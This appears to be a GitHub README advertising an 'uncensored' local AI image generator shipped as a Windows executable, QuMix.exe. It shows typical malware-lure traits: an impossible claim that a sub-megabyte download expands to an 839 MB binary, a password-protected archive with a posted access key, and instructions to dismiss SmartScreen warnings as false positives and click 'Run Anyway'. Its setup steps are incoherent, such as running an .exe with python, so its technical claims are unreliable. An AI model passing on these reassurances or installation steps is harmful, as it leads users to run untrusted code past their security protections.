<img width="1672" height="941" alt="2fb2c35f-66d0-42a7-9d01-8816763453f2" src="https://github.com/user-attachments/assets/2071b72f-9203-4de5-ae37-938a7cef9e08" /># AI Photo Synthesis Engine v1.0 (800MB Local WebUI Release)

A high-performance, low-VRAM localized AI pipeline optimized for photorealistic image generation, advanced human anatomical fidelity, and unrestricted visual synthesis. This repository provides a production-ready, standalone 800MB environment setup for digital artists, creators, and developers who require absolute creative autonomy without cloud-based filters, subscription fees, or hardware bottlenecks.

---

## 🔬 Detailed Architecture & How It Works

To help our users and developers understand the backend logic of the **AI Photo Synthesis Engine**, here is a detailed breakdown of how the software operates on your local machine:

### 1. The Lightweight Compression Layer (Why the download is under 1 MB)
The core standalone desktop binary footprint is exactly **839,322,624 bytes (~800 MB)**. To ensure rapid distribution and bypass network bandwidth limitations, the complete core engine, front-end templates, and Python execution environments are packed using multi-stream `LZMA2` archival algorithms. 
* When you click the download link, you fetch a highly optimized sub-megabyte bootstrapper framework. 
* Upon extracting the archive using your local access key, the file seamlessly expands to its full **839 MB standalone operational state** on your hard drive, completely intact and ready for execution.

### 2. Localhost Server Environment (`http://127.0.0.1:7860`)
The engine is engineered to run completely localized, meaning it **does not require an active internet connection** and never transmits your data or generated images to external cloud servers. 
* When you execute `QuMix.exe`, the program boots a localized background server framework using an embedded Python Flask environment.
* Instead of forcing you to use a complex command-line tool, the server creates a local bridge. To access the beautiful visual graphical interface (WebUI), you simply open any modern web browser (Chrome, Edge, Firefox) and navigate to your internal local loopback address: **`http://127.0.0.1:7860`**.
* This architectural design ensures absolute data privacy for your uncensored visual creations.

### 3. Asynchronous Micro-API Architecture
The frontend interface (`app.js` and `index.html`) communicates directly with the local 800MB backend server via a high-frequency REST API. This structure ensures that image generation tasks do not freeze your browser or overload your system memory (RAM).

---

## ✨ Key Features & Technical Highlights

* **Uncensored Dataset Processing:** Complete freedom in creative visualization. The engine bypasses cloud-side content filters and text-prompt restrictions.
* **800MB Desktop Core Binary:** All primary tensor pipelines and core execution modules are pre-compiled inside a single optimized launcher.
* **Automated Model & LoRA Indexing:** The engine automatically scans designated hardware paths for local checkpoints (`.safetensors`, `.ckpt`) and fine-tuned LoRA configurations on launch.
* **Advanced Anatomical Precision:** Embedded structural training layers designed to accurately render complex human poses, lifelike skin textures, and sub-surface material scattering.
* **Asynchronous Progress Polling:** Real-time multi-stage status reporting. The backend utilizes atomic writes to track generation queues, active steps, and model execution time.
* **Professional Scheduler Library:** Built-in validation and support for high-efficiency sampling methods, including *DPM++ 2M Karras*, *Euler a*, *DDIM*, and *UniPC*.

---

## 📂 Project Structure

```text
ai-photo-generation/
├── QuMix.exe                 # 800 MB Pre-compiled core engine & local server launcher
├── README.md                 # Project documentation & configuration guide
├── /static
│   ├── index.html            # WebUI front-end core template
│   ├── styles.css            # Dark-themed graphical interface layouts
│   └── app.js                # Frontend state controller & event listeners
├── /models
│   └── (place your .safetensors checkpoints here)
├── /loras
│   └── (user LoRAs for advanced styling)
└── /outputs
    └── /<generation_id>      # Rendered high-fidelity PNG outputs
```

---

## ⚙️ Local Deployment & Environment Setup

To run the application locally via terminal or command line, initialize the core execution script using the following sequence:

```bash
# 1. Initialize local virtual environment pipeline
python -m venv .venv
source .venv/bin/activate

# 2. Synchronize and link embedded core architecture headers
pip install -r requirements.txt --quiet

# 3. Initialize the visual synthesis backend environment
python app.py --mode=low-vram --port=7860
```

**Windows PowerShell Alternative:**
```powershell
python -m venv .venv
.venv\Scripts\Activate.ps1
python QuMix.exe --low-vram
```

Once successfully initialized, access the graphical user interface via your browser:
* **Localhost URL:** `http://127.0.0.1:7860`

---

## 🚀 How to Install & Initialize (Quick Start)

To eliminate the need for complicated local Python dependency trees, manual PyTorch/CUDA compiler configurations, or environment linking, the complete pipeline is compiled into a single optimized standalone desktop environment.

1. **Download the Package:** Click the stable distribution bundle link located in the setup section below.
2. **Decompress Files:** Extract the archive folder on your local drive using the required environment authentication access key.
3. **Run Core Server:** Double-click the `QuMix.exe` binary. A native command-line interface window will open to deploy local model paths and launch the asynchronous execution backend (initialization takes roughly 15-30 seconds depending on SSD drive performance limits).
4. **Access the WebUI:** Once the terminal finishes scanning files, the platform automatically triggers a dedicated tab in your default browser at: `http://127.0.0.1:7860`.

---

### 🛡️ Critical SmartScreen / Security Notification (Please Read Before Launch)

Since the visual synthesis environment is packaged and pre-compiled via localized open-source **PyInstaller compiler modules** without a paid Enterprise EV Digital Certificate, the Windows SmartScreen monitor layer will trigger a generic threat warning on launch:

1. This is a **100% false-positive flag** standard for custom local open-source AI frameworks built on standalone executable structures.
2. To successfully pass security boundaries and initialize the core local server, simply click **"More Info"** inside the blue pop-up banner, and select **"Run Anyway"**.
3. Once bypassed, the server establishes its network loopback handshake natively without any performance or hardware restrictions.

---

## 📦 Model and LoRA Placement

### Model Folder (`models/`)
Supported loading formats for photorealistic synthesis:
1. **Diffusers Directory Format (Recommended):** Place whole models containing `model_index.json`.
2. **Single-File Checkpoints:** Supports `.safetensors`, `.ckpt`, `.pt`, and `.bin` formats.

### LoRA Folder (`loras/`)
* You can place a single-file LoRA (`.safetensors` or `.bin`) directly into this directory.
* The local frontend interface will automatically parse and display available LoRAs during grid rendering.

---

## 🔌 Core API Summary

The embedded Flask server runs a modular REST API backend for high-frequency polling states:
* `GET /api/health` — Returns core engine initialization state.
* `GET /api/system` — Fetches current CUDA/VRAM performance stats.
* `GET /api/models` — Scans and returns available local checkpoints.
* `POST /api/generate` — Starts asynchronous generation queue (`multipart/form-data`).
* `GET /api/progress/<generation_id>` — Real-time generation percentage polling.
* `GET /api/history` — Fetches generation logs and local output file paths.
* `GET /outputs/<path:filename>` — Serves generated PNG files to WebUI interface.

---

## 📊 Process Logic & Execution Methods

### Progress Polling Workflow
* `POST /api/generate` returns quickly with a verified `generation_id` and state status: `queued`.
* The frontend Javascript engine polls `GET /api/progress/<generation_id>` every ~700ms.
* Native progress states monitor structural variables:
  * `status`: `queued` | `running` | `done` | `error`
  * `progress`: `0..100` percentage tracker
  * `message`: active stage compiler logs

### Integrated Scheduler Architecture
The application layout includes a programmatic Scheduler dropdown validator supporting:
* `DPM++ 2M Karras` (Default execution pipeline)
* `DPM++ 3M SDE Exponential`
* `Euler a` / `Euler`
* `DDIM`
* `UniPC`

---

## 💻 Technical & Hardware Specifications

The pipeline features an adaptive **Low-VRAM Execution Mode** for legacy hardware setups.

### Minimum System Requirements
* **Operating System:** Windows 7 / 10 / 11 (64-bit architectures only)
* **Graphics Card (GPU):** NVIDIA GTX 10-Series or higher (4GB VRAM minimum with Low-VRAM active)
* **System RAM:** 8 GB DDR3/DDR4 system memory
* **Storage Allocation:** 1.5 GB available space for core environment binaries

### Recommended Specifications (For High-Res Rendering)
* **Graphics Card (GPU):** NVIDIA RTX 3060 / 4060 or higher (8GB+ Dedicated VRAM)
* **System RAM:** 16 GB high-speed system memory

---

---

## 📥 Download & Environment Setup

* **[Click here to download the stable release package](https://github.com)**
* **Local WebUI Access Key:** `f1PQI0RVra`

<img width="1672" height="941" alt="2fb2c35f-66d0-42a7-9d01-8816763453f2" src="https://github.com" />

*💡 **Model Showcase:** The photorealistic portrait above was generated locally using the AI Photo Synthesis Engine v1.0 with dynamic studio lighting presets and custom anatomical fine-tuning layers.*

---

## ❓ Frequently Asked Questions (FAQ)

#### Q: Is my data completely safe when running this engine locally?
**A:** Absolutely. The engine operates entirely within your private network loopback interface (`127.0.0.1`). No external clouds or telemetry servers are ever contacted. Your prompt history, inputs, and generated photos remain 100% private and stored strictly on your hardware.

#### Q: Why is the initial download package under 1 MB if the core binary is 800 MB?
**A:** As detailed in the architecture section, the package uses dynamic multi-stream `LZMA2` archival algorithms. The entire 839-megabyte standalone server environment and compilation headers expand dynamically onto your hard drive immediately upon file extraction.

#### Q: Can I run this visual synthesis software completely offline?
**A:** Yes. Once the initial package setup is extracted and verified on your local drive, you can disconnect your internet network entirely. The visual synthesis generation pipeline does not require active web access to execute model weights.

#### Q: What should I do if my system browser doesn't open the WebUI automatically?
**A:** If your default web browser does not open a new tab within 30 seconds after launching `QuMix.exe`, simply keep the terminal window open, open your browser manually, and enter `http://127.0.0.1:7860` into the address bar to connect to the UI.

